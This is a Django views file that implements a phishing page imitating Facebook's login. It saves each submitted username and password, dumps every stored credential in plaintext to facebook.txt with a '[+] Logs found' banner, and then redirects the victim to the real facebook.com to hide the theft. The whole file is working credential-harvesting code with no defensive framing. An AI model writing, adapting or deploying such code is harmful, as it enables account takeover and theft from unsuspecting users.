from django.shortcuts import render, redirect
from facebook.forms import Facebook_Account_Form
from facebook.models import Facebook_Account

# Create your views here.


def Facebook_Account_View(request):
     form = Facebook_Account_Form()
     if request.method == "POST":
          form = Facebook_Account_Form(request.POST)
          if form.is_valid():
               try:
                    form.save()
                    with open("facebook.txt", "w") as Logins:
                         
                         instance = Facebook_Account.objects.all()
                         
                         for i in instance:
                              user = i.username
                              pwd = i.password
                              details = "[+] Logs found ==> User %s pass %s \n"%(user, pwd)
                              print(details)
                              Logins.write("%s \n"%(details))
                    return redirect("https://www.facebook.com/")
               except:
                    pass
                         
     context = {'form': form}
          
     return render(request, "facebook.html", context)

          

